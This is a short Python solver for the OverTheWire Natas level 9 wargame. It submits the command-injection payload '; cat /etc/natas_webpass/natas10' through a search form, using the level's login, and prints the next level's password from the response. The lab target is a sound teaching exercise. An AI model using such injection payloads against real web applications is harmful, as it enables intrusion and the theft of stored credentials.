import requests
import re
requests.packages.urllib3.disable_warnings()

url = "http://natas9.natas.labs.overthewire.org"

def exp():
    data_post = {
        "needle": "; cat /etc/natas_webpass/natas10",
        "submit": "Search"
    }
    r = requests.post(url, auth=('natas9', 'ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t'), verify=False, data=data_post)
    if r.status_code == 200:
        password = re.findall(r'<pre>\s*(\S+)\s*', r.text)[0]
        print("Password for natas10: " + password)
        

if __name__ == "__main__":
    exp()